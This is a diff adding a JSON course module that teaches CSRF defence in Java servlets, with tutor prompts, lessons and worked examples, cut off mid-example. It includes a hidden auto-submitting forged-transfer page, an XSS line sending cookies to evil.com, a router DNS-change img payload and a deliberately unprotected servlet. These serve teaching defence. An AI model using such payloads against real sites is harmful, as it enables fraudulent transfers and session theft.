@@ -1,0 +1,1609 @@
+{
+  "course_id": "csrf_protection",
+  "title": "CSRF Protection",
+  "description": "Master Cross-Site Request Forgery: understand how attackers trick browsers into sending forged requests, and learn to defend with tokens, SameSite cookies, and secure session management.",
+  "difficulty": "ADVANCED",
+  "estimated_hours": 10,
+  "prerequisites": [
+    "java_classes_objects",
+    "java_strings_security"
+  ],
+  "learning_outcomes": [
+    "Explain what CSRF is using real-world analogies",
+    "Trace a complete CSRF attack step by step",
+    "Identify which HTTP methods and actions are vulnerable to CSRF",
+    "Implement CSRF token generation using SecureRandom",
+    "Store and validate CSRF tokens in server sessions",
+    "Embed CSRF tokens in HTML forms as hidden fields",
+    "Validate CSRF tokens on every state-changing request",
+    "Configure SameSite cookie attributes (Strict, Lax, None)",
+    "Implement Double Submit Cookie pattern",
+    "Check Referer and Origin headers as secondary defence",
+    "Build a complete CSRF protection filter for Java servlets",
+    "Distinguish CSRF from XSS and understand how they interact"
+  ],
+  "neurodivergent_design": {
+    "visual_first": true,
+    "analogy_based": true,
+    "progressive_difficulty": true,
+    "colour_coded_sections": true,
+    "short_focused_exercises": true,
+    "immediate_feedback": true,
+    "multiple_explanation_styles": true,
+    "estimated_focus_time_per_exercise": "3-5 minutes"
+  },
+  "ai_tutor_config": {
+    "personality": "Encouraging, patient, uses real-world analogies. Never judges. Celebrates small wins. Explains CSRF like forged signatures and tricked messengers.",
+    "intervention_triggers": {
+      "idle_40_seconds": "CSRF can feel confusing at first because the attack happens invisibly. Think of it like someone forging YOUR signature on a cheque. Want me to walk through the bank analogy again?",
+      "idle_90_seconds": "The key insight is: your browser automatically sends cookies with every request -- even requests triggered by an attacker's page. That is what makes CSRF possible. Shall I draw out the flow?",
+      "idle_180_seconds": "No worries -- this is one of the trickier web attacks to understand. Let me break it into 3 simple steps: (1) You log in, (2) You visit evil page, (3) Evil page uses YOUR session. Want to try a simpler exercise first?",
+      "first_error": "Good attempt! CSRF errors usually come from token mismatches or missing validation. Let me help you trace where the token goes wrong.",
+      "repeated_errors": "CSRF has many moving parts -- sessions, tokens, cookies, forms. Let me simplify: focus ONLY on the token flow first. Generate it, store it, embed it, validate it. One step at a time.",
+      "after_success": "Excellent! You just protected a form against CSRF. Every bank, every social media site, every shopping cart needs exactly this protection. Real-world skill unlocked!"
+    },
+    "encouragement_phrases": [
+      "CSRF is the 'invisible attack' -- understanding it puts you ahead of most developers!",
+      "You are learning to protect millions of users from having their accounts hijacked.",
+      "Every form you protect with a CSRF token is a real defence against real attacks.",
+      "Banks, hospitals, and governments all need developers who understand CSRF.",
+      "The fact that you can trace this attack flow means you THINK like a security expert.",
+      "SameSite cookies are modern defence -- you are learning cutting-edge protection.",
+      "Most developers skip CSRF protection. You are not most developers!",
+      "Token generation, validation, embedding -- you are building a complete defence system.",
+      "Understanding CSRF means understanding how the web REALLY works under the hood.",
+      "Every exercise makes you a stronger defender. Keep going!"
+    ],
+    "explanation_styles": {
+      "analogy": "CSRF is like someone forging your signature on a cheque while you are at the bank. You are logged in (the bank knows you), and the forger tricks the bank into processing their cheque because it looks like it came from you.",
+      "visual": "Draw three boxes: YOUR BROWSER, EVIL SITE, BANK SERVER. Arrow 1: You log into bank (get cookie). Arrow 2: You visit evil site. Arrow 3: Evil site makes your browser send request to bank WITH your cookie. Bank thinks it is you!",
+      "step_by_step": "Step 1: You log into bank.com -- browser stores session cookie. Step 2: You visit evil-site.com in another tab. Step 3: Evil site has hidden form/image that sends request to bank.com. Step 4: Browser automatically attaches your bank cookies. Step 5: Bank processes the request thinking it is from you.",
+      "code_trace": "Line 1: Server generates random token (SecureRandom, 32 bytes, Base64). Line 2: Token stored in session. Line 3: Token embedded in form as hidden field. Line 4: On POST, server compares form token with session token. Line 5: Match = legitimate. Mismatch = CSRF attack blocked.",
+      "comparison": "XSS = attacker injects script INTO your site. CSRF = attacker uses a DIFFERENT site to trick your browser. XSS steals data. CSRF performs actions. XSS needs an injection point. CSRF needs you to be logged in."
+    }
+  },
+  "lessons": [
+    {
+      "lesson_id": "csrf_protection_lesson_1",
+      "title": "CSRF Protection: From Attack to Defence",
+      "theory": {
+        "introduction": "Imagine you are at your bank, logged in and doing transfers. In another browser tab, you visit a funny memes website. Unknown to you, that memes site has a hidden instruction that tells your browser: 'Send 1000 pounds from this person to account evil37.' Your browser obeys -- because it automatically attaches your bank session cookie to EVERY request to bank.com, even requests triggered by other websites. The bank sees a valid session and processes the transfer. You never clicked anything. You never saw a form. You just lost 1000 pounds.\n\nThis is Cross-Site Request Forgery (CSRF) -- also called 'session riding' or 'one-click attack.' It is consistently in the OWASP Top 10 because it exploits a fundamental feature of how web browsers work: cookies are sent automatically with every request to a domain, regardless of which website initiated the request.\n\nCSRF does not steal your data (that is XSS). Instead, it PERFORMS ACTIONS as you -- transfers money, changes your email, deletes your account, posts on your behalf. The victim is your authenticated session. The weapon is your own browser.\n\nIn this course, you will learn exactly how CSRF works, trace real attacks step by step, and build complete defences using tokens, SameSite cookies, and header validation. By the end, you will be able to protect any Java web application against this invisible attack.",
+        "why_important": "CSRF has been used in real attacks against banks, social media platforms, and government systems. In 2008, a CSRF vulnerability in a major bank allowed attackers to transfer funds from any logged-in customer. Netflix, YouTube, and ING Direct have all had CSRF vulnerabilities. The attack is invisible to the user -- they never see a suspicious form or click a dangerous link. Without CSRF protection, ANY action a logged-in user can perform (transfer money, change password, delete account) can be performed by an attacker through a malicious website. Modern frameworks like Spring Security include CSRF protection by default, but understanding HOW it works is essential for configuring it correctly and protecting custom applications.",
+        "key_concepts": [
+          {
+            "concept": "What is CSRF? The Forged Cheque Analogy",
+            "explanation": "Cross-Site Request Forgery means an attacker tricks your browser into sending a request to a website where you are already logged in. The website cannot tell the difference between a request you intended and one the attacker triggered.\n\nAnalogy: You are at the bank (logged in). Someone slips a pre-filled cheque into your pile of paperwork. When the bank processes your papers, it processes the forged cheque too -- because it came from YOUR session at YOUR counter.\n\nKey insight: the browser sends cookies AUTOMATICALLY with every request to a domain. The attacker does not need your password. They just need you to visit their page while logged into the target site.",
+            "example": "// NORMAL request (you click 'Transfer'):\n// POST https://bank.com/transfer\n// Cookie: session=abc123    <-- browser adds automatically\n// Body: amount=50&to=friend\n\n// CSRF attack (evil page triggers):\n// POST https://bank.com/transfer\n// Cookie: session=abc123    <-- browser STILL adds automatically!\n// Body: amount=1000&to=evil37\n\n// The bank sees BOTH requests with valid session cookie.\n// It cannot tell which one YOU actually wanted.",
+            "ai_hint": "The attacker never sees your cookie or password. They just trick your browser into using them. It is YOUR browser that betrays you!"
+          },
+          {
+            "concept": "How CSRF Works: The 4-Step Attack",
+            "explanation": "Step 1 -- LOGIN: You log into bank.com. The server creates a session and sends a session cookie to your browser.\n\nStep 2 -- BAIT: You visit evil-site.com (maybe a link in an email, a forum post, or a meme page). You have NOT logged out of bank.com.\n\nStep 3 -- TRIGGER: The evil page contains hidden HTML that makes your browser send a request to bank.com. This could be an img tag, a hidden form that auto-submits, or JavaScript.\n\nStep 4 -- EXECUTION: Your browser sends the request to bank.com and AUTOMATICALLY attaches the session cookie. The bank sees a valid session and processes the transfer. You never knew it happened.",
+            "example": "// STEP 3 -- Three ways evil page triggers the request:\n\n// Method 1: Hidden image (GET request)\n// <img src=\"https://bank.com/xfer?amt=1000&to=evil37\">\n\n// Method 2: Hidden form (POST request)\n// <form action=\"https://bank.com/xfer\" method=\"POST\">\n//   <input type=\"hidden\" name=\"amt\" value=\"1000\">\n//   <input type=\"hidden\" name=\"to\" value=\"evil37\">\n// </form>\n// <script>document.querySelector('form').submit();</script>\n\n// Method 3: XMLHttpRequest (POST request)\n// var req = new XMLHttpRequest();\n// req.open('POST','https://bank.com/xfer');\n// req.setRequestHeader('Content-Type',\n//   'application/x-www-form-urlencoded');\n// req.send('amt=1000&to=evil37');",
+            "ai_hint": "The attack works because the browser treats bank.com cookies as valid regardless of which page initiated the request. This is how cookies were designed to work!"
+          },
+          {
+            "concept": "Why Cookies Are the Problem",
+            "explanation": "HTTP is stateless -- each request is independent. Cookies solve this by storing a session ID that the browser sends with EVERY request to that domain. This is how 'staying logged in' works.\n\nBut this automatic cookie attachment is also what makes CSRF possible. The browser does not ask: 'Did the user intend this request?' It just sends the cookie.\n\nThis is NOT a bug in your code. It is how the web was designed. CSRF protection is about adding extra checks that the attacker CANNOT forge.",
+            "example": "// When you log in, the server sends:\n// Set-Cookie: JSESSIONID=abc123; Path=/; HttpOnly\n\n// From now on, EVERY request to this domain includes:\n// Cookie: JSESSIONID=abc123\n\n// This happens automatically for:\n// - Links you click\n// - Forms you submit\n// - Images the page loads\n// - AJAX requests\n// - Requests triggered by OTHER websites  <-- CSRF!\n\n// The cookie does NOT know who initiated the request.",
+            "ai_hint": "HttpOnly protects cookies from JavaScript theft (XSS). But HttpOnly does NOT protect against CSRF because the browser sends the cookie regardless."
+          },
+          {
+            "concept": "CSRF Tokens: The Primary Defence",
+            "explanation": "A CSRF token is a random, unpredictable value that the server generates and ties to the user's session. The token is embedded in every form as a hidden field. When the form is submitted, the server checks: does the token in the request match the token in the session?\n\nWhy this works: The attacker's evil page can make your browser send cookies (automatic), but the attacker CANNOT read the CSRF token from bank.com's HTML (blocked by Same-Origin Policy). So the attacker cannot include the correct token in their forged request.\n\nThe token must be: (1) cryptographically random, (2) unique per session, (3) validated on every state-changing request.",
+            "example": "// SERVER SIDE - Generate and store token:\nimport java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class CSRFTokenGenerator {\n    public static String generateToken() {\n        SecureRandom random = new SecureRandom();\n        byte[] bytes = new byte[32];\n        random.nextBytes(bytes);\n        return Base64.getUrlEncoder()\n            .withoutPadding()\n            .encodeToString(bytes);\n    }\n}\n\n// In doGet (serving the form):\nString token = CSRFTokenGenerator.generateToken();\nrequest.getSession().setAttribute(\"csrf_token\", token);\n// Include in form: <input type=\"hidden\" name=\"csrf_token\" value=\"...\">",
+            "ai_hint": "SecureRandom is cryptographically strong. Do NOT use Math.random() or java.util.Random for security tokens -- they are predictable!"
+          },
+          {
+            "concept": "Token Validation: Checking the Token",
+            "explanation": "When a POST request arrives, the server must: (1) Get the token from the session, (2) Get the token from the request parameter, (3) Compare them. If they match, the request is legitimate. If they do not match or the token is missing, reject the request immediately.\n\nCritical: use constant-time comparison to prevent timing attacks. The attacker should learn NOTHING from the rejection -- not which character was wrong, not how long validation took.",
+            "example": "// In doPost (processing the form):\nprotected void doPost(HttpServletRequest request,\n                      HttpServletResponse response) {\n    String sessionToken = (String) request.getSession()\n        .getAttribute(\"csrf_token\");\n    String formToken = request.getParameter(\"csrf_token\");\n    \n    if (sessionToken == null || formToken == null ||\n        !MessageDigest.isEqual(\n            sessionToken.getBytes(),\n            formToken.getBytes())) {\n        response.sendError(403, \"CSRF validation failed\");\n        return;\n    }\n    \n    // Token valid -- process the transfer\n    processTransfer(request, response);\n}",
+            "ai_hint": "MessageDigest.isEqual() does constant-time comparison. Using .equals() would leak timing information that attackers could use to guess the token character by character."
+          },
+          {
+            "concept": "SameSite Cookies: Modern Browser Defence",
+            "explanation": "SameSite is a cookie attribute that tells the browser: only send this cookie with requests that originate from the SAME site. This directly blocks CSRF because the evil page is a DIFFERENT site.\n\nThree modes:\n- Strict: Cookie NEVER sent with cross-site requests. Maximum security but breaks some legitimate flows (e.g., clicking a link from email to a logged-in site).\n- Lax: Cookie sent with top-level navigations (clicking links) but NOT with form submissions or AJAX from other sites. Good balance.\n- None: Cookie always sent (must use Secure flag). No CSRF protection.\n\nModern browsers default to Lax if SameSite is not specified.",
+            "example": "// Setting SameSite in Java Servlet:\nCookie sessionCookie = new Cookie(\"JSESSIONID\", sessionId);\nsessionCookie.setHttpOnly(true);  // Protect from XSS\nsessionCookie.setSecure(true);    // HTTPS only\nsessionCookie.setPath(\"/\");\n\n// SameSite must be set via header (no direct API in older servlets):\nresponse.setHeader(\"Set-Cookie\",\n    \"JSESSIONID=\" + sessionId +\n    \"; Path=/; HttpOnly; Secure; SameSite=Lax\");\n\n// SameSite=Strict -- maximum protection, blocks all cross-site\n// SameSite=Lax    -- blocks POST/AJAX cross-site, allows link clicks\n// SameSite=None   -- no protection (requires Secure flag)",
+            "ai_hint": "SameSite=Lax is the sweet spot for most applications. It stops CSRF POST attacks while still allowing users to follow links from emails and other sites."
+          },
+          {
+            "concept": "Double Submit Cookie Pattern",
+            "explanation": "An alternative to server-side token storage. The server sets a random token as BOTH a cookie AND a hidden form field. On submission, the server compares the cookie value with the form value.\n\nWhy it works: the attacker can make your browser SEND cookies, but the attacker cannot READ cookies from another domain. So they cannot copy the cookie value into the form field.\n\nAdvantage: no server-side state needed (good for stateless/distributed systems). Disadvantage: if the attacker can set cookies (via subdomain or XSS), this pattern is broken.",
+            "example": "// Double Submit Cookie Implementation:\n\n// Step 1: Server sets token as cookie AND in form\nString token = CSRFTokenGenerator.generateToken();\nCookie csrfCookie = new Cookie(\"csrf_token\", token);\ncsrfCookie.setPath(\"/\");\ncsrfCookie.setHttpOnly(false); // JS needs to read it\ncsrfCookie.setSecure(true);\nresponse.addCookie(csrfCookie);\n// Also embed in form: <input type=\"hidden\" name=\"csrf_token\" value=\"TOKEN\">\n\n// Step 2: Server validates both match\nString cookieToken = null;\nfor (Cookie c : request.getCookies()) {\n    if (\"csrf_token\".equals(c.getName())) cookieToken = c.getValue();\n}\nString formToken = request.getParameter(\"csrf_token\");\nif (!MessageDigest.isEqual(cookieToken.getBytes(), formToken.getBytes())) {\n    response.sendError(403, \"CSRF rejected\");\n}",
+            "ai_hint": "Double Submit is stateless -- no session storage needed. But the cookie MUST NOT be HttpOnly (JavaScript needs to read it for AJAX requests). Trade-off!"
+          },
+          {
+            "concept": "Referer and Origin Header Checks",
+            "explanation": "The browser sends Referer and Origin headers that tell the server which page initiated the request. Checking these headers provides a secondary defence layer.\n\nOrigin header: sent with POST requests, contains just the scheme and domain (https://bank.com). More reliable than Referer.\n\nReferer header: sent with most requests, contains the full URL. Can be stripped by privacy settings.\n\nLimitation: these headers CAN be suppressed (not sent at all) in some situations. So use them as an ADDITIONAL check, not the ONLY defence.",
+            "example": "// Checking Origin header:\nprotected void doPost(HttpServletRequest request,\n                      HttpServletResponse response) {\n    String origin = request.getHeader(\"Origin\");\n    String referer = request.getHeader(\"Referer\");\n    \n    // Check Origin first (more reliable)\n    if (origin != null) {\n        if (!origin.equals(\"https://bank.com\")) {\n            response.sendError(403, \"Invalid origin\");\n            return;\n        }\n    } else if (referer != null) {\n        // Fallback to Referer\n        if (!referer.startsWith(\"https://bank.com/\")) {\n            response.sendError(403, \"Invalid referer\");\n            return;\n        }\n    } else {\n        // Both missing -- reject or allow with extra caution\n        response.sendError(403, \"Missing origin\");\n        return;\n    }\n    \n    // Also validate CSRF token (defence in depth)\n    validateCSRFToken(request, response);\n}",
+            "ai_hint": "Origin + CSRF token together = defence in depth. If one fails, the other catches the attack."
+          },
+          {
+            "concept": "Which Actions Need CSRF Protection?",
+            "explanation": "CSRF protection is needed on every STATE-CHANGING action. If a request modifies data, it needs protection.\n\nNEEDS protection: transfers, password changes, email changes, account deletion, posting content, changing settings, admin actions, logout (yes, logout!).\n\nDoes NOT need protection: viewing pages, reading data, searching. These are safe because CSRF cannot read the response (Same-Origin Policy blocks it).\n\nRule of thumb: protect ALL POST, PUT, DELETE, PATCH requests. GET requests should NEVER change state (this is an HTTP specification requirement, not just a security recommendation).",
+            "example": "// NEEDS CSRF protection:\n// POST /transfer          -- moves money\n// POST /change-password   -- modifies credentials\n// POST /change-email      -- modifies account\n// DELETE /account         -- destructive action\n// POST /post-comment      -- creates content\n// PUT /settings           -- modifies preferences\n// POST /logout            -- ends session (CSRF logout attack)\n\n// Does NOT need CSRF protection:\n// GET /account            -- reads data only\n// GET /search?q=...       -- reads data only\n// GET /products           -- reads data only\n\n// IMPORTANT: GET should NEVER change state!\n// BAD:  GET /transfer?amount=1000&to=evil37\n// GOOD: POST /transfer with amount=1000&to=evil37",
+            "ai_hint": "If your GET requests change state, you have TWO problems: (1) HTTP violation, (2) CSRF via img tags. Fix both!"
+          },
+          {
+            "concept": "CSRF vs XSS: Understanding the Difference",
+            "explanation": "These two attacks are often confused but they are fundamentally different:\n\nXSS (Cross-Site Scripting): Attacker injects malicious script INTO your website. The script runs in the victim's browser with full access to the page. Can steal cookies, modify content, redirect users.\n\nCSRF (Cross-Site Request Forgery): Attacker uses a DIFFERENT website to trick the victim's browser into sending requests. Cannot read responses. Cannot inject code. Can only trigger actions.\n\nDangerous combination: XSS can DEFEAT CSRF protection! If an attacker has XSS on your site, they can read the CSRF token from the page and include it in their forged request. This is why you need BOTH XSS prevention AND CSRF protection.",
+            "example": "// XSS Attack (script runs ON your site):\n// Attacker injects: <script>document.location=\n//   'https://evil.com/steal?cookie='+document.cookie</script>\n// Result: Attacker gets session cookie\n\n// CSRF Attack (triggered from DIFFERENT site):\n// Attacker's page: <form action=\"https://your-site.com/transfer\"...>\n// Result: Browser sends request with victim's cookies\n// Attacker CANNOT read the response\n\n// XSS + CSRF combo (worst case):\n// 1. Attacker has XSS on your site\n// 2. XSS reads CSRF token: document.querySelector('[name=csrf_token]').value\n// 3. Attacker includes valid token in forged request\n// 4. CSRF protection is bypassed!",
+            "ai_hint": "XSS is the master key that can unlock CSRF protection. Always fix XSS FIRST, then add CSRF tokens as defence in depth."
+          },
+          {
+            "concept": "Building a Complete CSRF Filter",
+            "explanation": "Rather than adding token checks to every servlet, create a reusable filter that intercepts ALL POST requests and validates the CSRF token automatically.\n\nThe filter should: (1) Skip GET/HEAD/OPTIONS requests (read-only), (2) Generate a new token if none exists in the session, (3) Validate the token on every POST/PUT/DELETE, (4) Reject requests with invalid or missing tokens, (5) Make the token available for forms via request attribute.\n\nThis is exactly how frameworks like Spring Security implement CSRF protection internally.",
+            "example": "import javax.servlet.*;\nimport javax.servlet.http.*;\nimport java.io.IOException;\nimport java.security.MessageDigest;\n\npublic class CSRFFilter implements Filter {\n    public void doFilter(ServletRequest req, ServletResponse res,\n                         FilterChain chain)\n            throws IOException, ServletException {\n        HttpServletRequest request = (HttpServletRequest) req;\n        HttpServletResponse response = (HttpServletResponse) res;\n        HttpSession session = request.getSession();\n        \n        // Generate token if not exists\n        if (session.getAttribute(\"csrf_token\") == null) {\n            session.setAttribute(\"csrf_token\",\n                CSRFTokenGenerator.generateToken());\n        }\n        \n        // Skip safe methods\n        String method = request.getMethod().toUpperCase();\n        if (\"GET\".equals(method) || \"HEAD\".equals(method)) {\n            request.setAttribute(\"csrf_token\",\n                session.getAttribute(\"csrf_token\"));\n            chain.doFilter(req, res);\n            return;\n        }\n        \n        // Validate token for state-changing methods\n        String sessionToken = (String) session.getAttribute(\"csrf_token\");\n        String requestToken = request.getParameter(\"csrf_token\");\n        \n        if (sessionToken == null || requestToken == null ||\n            !MessageDigest.isEqual(\n                sessionToken.getBytes(), requestToken.getBytes())) {\n            response.sendError(403, \"CSRF token invalid\");\n            return;\n        }\n        \n        // Valid -- regenerate token (one-time use)\n        session.setAttribute(\"csrf_token\",\n            CSRFTokenGenerator.generateToken());\n        chain.doFilter(req, res);\n    }\n}",
+            "ai_hint": "Regenerating the token after each valid POST prevents token reuse attacks. This is called 'per-request tokens' vs 'per-session tokens.'"
+          },
+          {
+            "concept": "Real-World CSRF Attacks",
+            "explanation": "CSRF has caused major security incidents:\n\n1. ING Direct (2008): Attackers could transfer money from any logged-in customer by crafting a CSRF request to the transfer endpoint.\n\n2. Netflix (2006): CSRF allowed attackers to change the email address on any logged-in account, then use password reset to take over the account completely.\n\n3. YouTube (2008): Almost all actions were vulnerable to CSRF -- attackers could add videos to favourites, subscribe to channels, and send messages on behalf of victims.\n\n4. Router CSRF: Home routers with default passwords (admin/admin) are attacked via CSRF to change DNS settings, redirecting all traffic through attacker-controlled servers.\n\nThese attacks succeeded because the applications trusted that requests with valid session cookies must be intentional.",
+            "example": "// Router CSRF Attack (still common today):\n// Attacker embeds in any web page:\n// <img src=\"http://192.168.1.1/admin/dns?primary=evil-dns-ip\">\n//\n// If the user is on their home network and the router\n// has default credentials, the DNS is changed.\n// ALL traffic now goes through attacker's DNS.\n// attacker can redirect bank.com to fake-bank.com\n//\n// Defence: Change default router password + CSRF tokens",
+            "ai_hint": "Router CSRF is especially dangerous because most people never change default router passwords. One malicious web page can compromise an entire network!"
+          },
+          {
+            "concept": "CSRF in AJAX/JavaScript Requests",
+            "explanation": "Modern web apps use AJAX (fetch/XMLHttpRequest) instead of form submissions. CSRF protection for AJAX works differently:\n\nInstead of a hidden form field, the CSRF token is sent as a custom HTTP header (e.g., X-CSRF-Token). The server validates this header.\n\nWhy headers work: the Same-Origin Policy prevents JavaScript on evil-site.com from setting custom headers on requests to bank.com. So the attacker cannot add the X-CSRF-Token header.\n\nThe token is typically stored in a meta tag on the page or in a cookie that JavaScript can read.",
+            "example": "// CLIENT SIDE - Send token as header:\nconst token = document.querySelector('meta[name=csrf-token]').content;\n\nfetch('/api/transfer', {\n    method: 'POST',\n    headers: {\n        'Content-Type': 'application/json',\n        'X-CSRF-Token': token   // Custom header\n    },\n    body: JSON.stringify({ amount: 50, to: 'friend' })\n});\n\n// SERVER SIDE - Check header:\nString headerToken = request.getHeader(\"X-CSRF-Token\");\nString sessionToken = (String) session.getAttribute(\"csrf_token\");\nif (!MessageDigest.isEqual(headerToken.getBytes(),\n                           sessionToken.getBytes())) {\n    response.sendError(403, \"Invalid CSRF token\");\n}",
+            "ai_hint": "For AJAX apps, the meta tag approach is clean: <meta name=\"csrf-token\" content=\"TOKEN_HERE\">. JavaScript reads it and attaches to every request."
+          }
+        ]
+      },
+      "complete_examples": [
+        {
+          "title": "Example 1: The Forged Cheque -- CSRF in Plain English",
+          "description": "Understand CSRF through a real-world analogy with no code",
+          "difficulty": "beginner",
+          "code": "// === THE FORGED CHEQUE ANALOGY ===\n//\n// NORMAL DAY AT THE BANK:\n// 1. You walk into bank (LOGIN) -- teller gives you a badge (SESSION COOKIE)\n// 2. You fill out transfer form (FORM WITH YOUR DATA)\n// 3. You hand form to teller (POST REQUEST)\n// 4. Teller sees your badge, processes form (SERVER CHECKS SESSION)\n//\n// CSRF ATTACK:\n// 1. You are at the bank, wearing your badge (LOGGED IN)\n// 2. Someone slips a pre-filled form into your stack (EVIL SITE)\n// 3. You unknowingly hand ALL forms to teller (BROWSER SENDS ALL)\n// 4. Teller sees your badge on the forged form too (VALID SESSION)\n// 5. Teller processes the forged transfer (ATTACK SUCCEEDS)\n//\n// THE FIX (CSRF TOKEN):\n// The bank gives you a SECRET STAMP that only you know.\n// Every form must have this stamp to be processed.\n// The forger does not know your stamp -- their form is rejected!",
+          "output": "No code output -- this is a conceptual example.\nUnderstand the analogy before moving to code.",
+          "ai_explanation": "This analogy maps directly to how CSRF works on the web. The badge is the session cookie (sent automatically). The secret stamp is the CSRF token (attacker cannot know it). The key insight: the bank (server) cannot distinguish your forms from the forger's forms without the stamp (token).",
+          "ai_challenge": "Think of 3 other real-life situations where something similar to CSRF could happen. Hint: anywhere automatic identification is used without verifying intent."
+        },
+        {
+          "title": "Example 2: A Vulnerable Transfer Page (No CSRF Protection)",
+          "description": "See a complete servlet that is vulnerable to CSRF",
+          "difficulty": "beginner",
+          "code": "import javax.servlet.*;\nimport javax.servlet.http.*;\nimport java.io.*;\n\npublic class TransferServlet extends HttpServlet {\n    \n    // Show the transfer form\n    protected void doGet(HttpServletRequest request,\n                         HttpServletResponse response)\n            throws ServletException, IOException {\n        \n        HttpSession session = request.getSession(false);\n        if (session == null || session.getAttribute(\"user\") == null) {\n            response.sendRedirect(\"/login\");\n            return;\n        }\n        \n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<h2>Transfer Money</h2>\");\n        out.println(\"<form method='POST' action='/transfer'>\");\n        out.println(\"Amount: <input name='amount' type='number'><br>\");\n        out.println(\"To: <input name='to' type='text'><br>\");\n        out.println(\"<button type='submit'>Transfer</button>\");\n        out.println(\"</form>\");\n        // NO CSRF TOKEN -- VULNERABLE!\n    }\n    \n    // Process the transfer\n    protected void doPost(HttpServletRequest request,\n                          HttpServletResponse response)\n            throws ServletException, IOException {\n        \n        HttpSession session = request.getSession(false);\n        if (session == null) {\n            response.sendRedirect(\"/login\");\n            return;\n        }\n        \n        String user = (String) session.getAttribute(\"user\");\n        String amount = request.getParameter(\"amount\");\n        String to = request.getParameter(\"to\");\n        \n        // Process transfer -- NO CSRF CHECK!\n        System.out.println(\"Transfer: \" + user + \" -> \" + to + \": $\" + amount);\n        response.getWriter().println(\"Transfer successful!\");\n    }\n}",
+          "output": "When user submits form: Transfer: alice -> friend: $50\nWhen attacker triggers CSRF: Transfer: alice -> evil37: $1000\nBoth look identical to the server!",
+          "ai_explanation": "This servlet checks if the user is logged in (session exists) but does NOT verify that the request came from the actual transfer form. Any website can trigger a POST to /transfer, and the browser will include the session cookie automatically. The server has no way to tell legitimate requests from forged ones.",
+          "ai_challenge": "Add a CSRF token to this servlet. You need to: (1) generate a token in doGet, (2) embed it in the form, (3) validate it in doPost."
+        },
+        {
+          "title": "Example 3: The CSRF Attack Page",
+          "description": "See exactly what the attacker's page looks like",
+          "difficulty": "beginner",
+          "code": "// === ATTACKER'S EVIL PAGE (evil-site.com/freegift.html) ===\n// The victim sees: a page about free gifts\n// Hidden underneath: a form that attacks bank.com\n\n// <!DOCTYPE html>\n// <html>\n// <head><title>Free Gift Cards!</title></head>\n// <body>\n//   <h1>Congratulations! You won a free gift card!</h1>\n//   <p>Click below to claim your prize...</p>\n//\n//   <!-- Hidden CSRF attack form -->\n//   <iframe name=\"hidden\" style=\"display:none\"></iframe>\n//   <form action=\"https://bank.com/transfer\"\n//         method=\"POST\" target=\"hidden\">\n//     <input type=\"hidden\" name=\"amount\" value=\"1000\">\n//     <input type=\"hidden\" name=\"to\" value=\"evil37\">\n//   </form>\n//   <script>\n//     document.querySelector('form').submit();\n//   </script>\n// </body>\n// </html>\n\n// WHAT HAPPENS:\n// 1. Victim visits this page (maybe from email link)\n// 2. Hidden form auto-submits to bank.com\n// 3. Browser sends bank.com session cookie\n// 4. Bank processes transfer: victim -> evil37: $1000\n// 5. iframe prevents the victim from seeing the bank response\n// 6. Victim sees only 'Free Gift Cards' page",
+          "output": "Victim sees: 'Congratulations! You won a free gift card!'\nHidden action: POST to bank.com/transfer?amount=1000&to=evil37\nResult: Money transferred without victim knowing",
+          "ai_explanation": "The attack page looks completely innocent. The form is hidden, the iframe prevents navigation, and the auto-submit happens in milliseconds. The victim never sees the bank page. The key technique: target='hidden' sends the form submission to the invisible iframe, so the page does not navigate away.",
+          "ai_challenge": "Modify this attack to also change the victim's email address on bank.com (POST to /change-email). How would this enable full account takeover?"
+        },
+        {
+          "title": "Example 4: CSRF Token Generator (SecureRandom)",
+          "description": "Build a cryptographically secure token generator",
+          "difficulty": "intermediate",
+          "code": "import java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class CSRFTokenGenerator {\n    \n    private static final SecureRandom secureRandom = new SecureRandom();\n    private static final int TOKEN_LENGTH = 32; // 256 bits\n    \n    /**\n     * Generates a cryptographically secure CSRF token.\n     * Uses SecureRandom for unpredictability and Base64 for safe encoding.\n     */\n    public static String generateToken() {\n        byte[] bytes = new byte[TOKEN_LENGTH];\n        secureRandom.nextBytes(bytes);\n        return Base64.getUrlEncoder()\n                     .withoutPadding()\n                     .encodeToString(bytes);\n    }\n    \n    public static void main(String[] args) {\n        // Generate 5 tokens to show randomness\n        System.out.println(\"=== CSRF Token Generator ===\");\n        for (int i = 1; i <= 5; i++) {\n            String token = generateToken();\n            System.out.println(\"Token \" + i + \": \" + token);\n            System.out.println(\"  Length: \" + token.length() + \" chars\");\n            System.out.println(\"  Entropy: 256 bits\");\n        }\n        \n        // Show that tokens are always different\n        String t1 = generateToken();\n        String t2 = generateToken();\n        System.out.println(\"\\nTokens equal? \" + t1.equals(t2));\n    }\n}",
+          "output": "=== CSRF Token Generator ===\nToken 1: kX7mP2qR9vL4nW6yB3tF8jH1dA5sC0gE-xZuIoMwKr\n  Length: 43 chars\n  Entropy: 256 bits\nToken 2: (different random string)\n  Length: 43 chars\n  Entropy: 256 bits\n... (all different)\n\nTokens equal? false",
+          "ai_explanation": "SecureRandom uses the operating system's cryptographic random number generator (e.g., /dev/urandom on Linux). This produces truly unpredictable bytes. Base64 URL encoding converts binary to safe ASCII characters. 32 bytes = 256 bits of entropy, making brute-force guessing impossible (2^256 possible values).",
+          "ai_challenge": "What happens if you use java.util.Random instead of SecureRandom? Research how Random's seed makes tokens predictable."
+        },
+        {
+          "title": "Example 5: Complete Protected Transfer Servlet",
+          "description": "The vulnerable servlet from Example 2, now with full CSRF protection",
+          "difficulty": "intermediate",
+          "code": "import javax.servlet.*;\nimport javax.servlet.http.*;\nimport java.io.*;\nimport java.security.MessageDigest;\n\npublic class SecureTransferServlet extends HttpServlet {\n    \n    protected void doGet(HttpServletRequest request,\n                         HttpServletResponse response)\n            throws ServletException, IOException {\n        \n        HttpSession session = request.getSession(false);\n        if (session == null || session.getAttribute(\"user\") == null) {\n            response.sendRedirect(\"/login\");\n            return;\n        }\n        \n        // CSRF DEFENCE: Generate and store token\n        String csrfToken = CSRFTokenGenerator.generateToken();\n        session.setAttribute(\"csrf_token\", csrfToken);\n        \n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<h2>Transfer Money</h2>\");\n        out.println(\"<form method='POST' action='/transfer'>\");\n        \n        // CSRF DEFENCE: Embed token in form\n        out.println(\"<input type='hidden' name='csrf_token' value='\" \n                    + csrfToken + \"'>\");\n        \n        out.println(\"Amount: <input name='amount' type='number'><br>\");\n        out.println(\"To: <input name='to' type='text'><br>\");\n        